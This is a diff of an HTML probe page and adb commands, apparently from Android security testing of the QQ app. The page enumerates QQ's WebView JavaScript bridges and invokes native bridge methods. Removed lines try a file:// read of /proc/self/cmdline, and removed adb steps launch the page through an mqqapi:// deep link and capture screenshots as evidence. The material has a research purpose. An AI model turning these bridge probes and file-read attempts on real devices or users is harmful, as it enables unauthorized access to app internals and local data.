@@ -1,4 +1,4 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>PFILE</title>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>PBRIDGE</title>
 <style>body{background:#fff;color:#000;font:12px monospace;word-break:break-all}</style></head>
 <body><div id="out">START</div>
 <script>
@@ -11,18 +11,13 @@ for (var i=0;i<keys.length;i++){var k=keys[i];
   if (/bridge|Bridge|jsApi|JsApi|mqq|qimei|webso|Weixin|hippy|dtBridge|tbs|qb|_mqq|Interface|jsbridge/i.test(k)){
     try{suspects.push(k+':'+typeof window[k]);}catch(e){}}}
 w('SUSPECTS(' + suspects.length + '): ' + suspects.join(' | '));
-var known = ['_mqqWebViewJSInterface','_webso','qimeiBridge','dtBridge','DTJsBridgeInterface','WeixinJSCore','QQJSCore','hippy','webbundle','docsPreview','docs','local_obj','ECommerceJSBridge','appApi','jsApi'];
-var hits=[];
-for (var j=0;j<known.length;j++){try{if(window[known[j]]!==undefined){
-  var meth=[];try{meth=Object.keys(window[known[j]]).slice(0,15);}catch(e){meth=['ERR'];}
-  hits.push(known[j]+'('+meth.join(',')+')');}}catch(e){}}
-w('HITS(' + hits.length + '): ' + (hits.join(' || ')||'NONE'));
-try{fetch('file:///proc/self/cmdline').then(function(r){return r.text();}).then(function(t){w('FILE_READ_OK: '+t.slice(0,150));}).catch(function(e){w('FILE_READ_ERR: '+e.message);});}catch(e){w('FETCH_ERR:'+e);}
-setTimeout(function(){w('DONE');},1500);
+window.JsBridge = { callback: function(id, res){ w('CB[' + id + ']=' + JSON.stringify(res)); } };
+function inv(s){ try { _mqqWebViewJSInterface.invoke(s); w('INV ' + s); } catch(e){ w('INV_ERR:' + e.message); } }
+setTimeout(function(){
+  inv('jsbridge://InputClickEvent/onClickInputCtrl#2001');
+  inv('jsbridge://UrlSaveVerifyV2/validCheck#2002');
+  inv('jsbridge://device/getNetworkInfo#2003');
+  inv('jsbridge://HtmlViewer/showHTML#2004');
+  setTimeout(function(){ w('DONE'); }, 4000);
+}, 800);
 </script></body></html>
-adb() { :; }
-adb -s 27011FDH20012W push /tmp/qq_bridge_probe/probe_file.html /storage/emulated/0/Android/data/com.tencent.mobileqq/files/pf.html 2>&1|tail -1
-adb -s 27011FDH20012W shell "am force-stop com.tencent.mobileqq"; sleep 2
-adb -s 27011FDH20012W shell 'am start -n com.tencent.mobileqq/.activity.SplashActivity --es jump_action_from_h5 "mqqapi://app/action?pkg=com.tencent.mobileqq&cmp=com.tencent.mobileqq.activity.QQBrowserDelegationActivity&url=file:///storage/emulated/0/Android/data/com.tencent.mobileqq/files/pf.html" --es package_from_h5 "pakage_from_h5"' 2>&1|tail -1
-sleep 12
-adb -s 27011FDH20012W shell "screencap -p /sdcard/v020_f2.png" && adb -s 27011FDH20012W pull /sdcard/v020_f2.png /Users/yoelhuang/.workbuddy/skills/android-security/tasks/qq_20260922/evidence/ >/dev/null 2>&1 && ls -la /Users/yoelhuang/.workbuddy/skills/android-security/tasks/qq_20260922/evidence/v020_f2.png
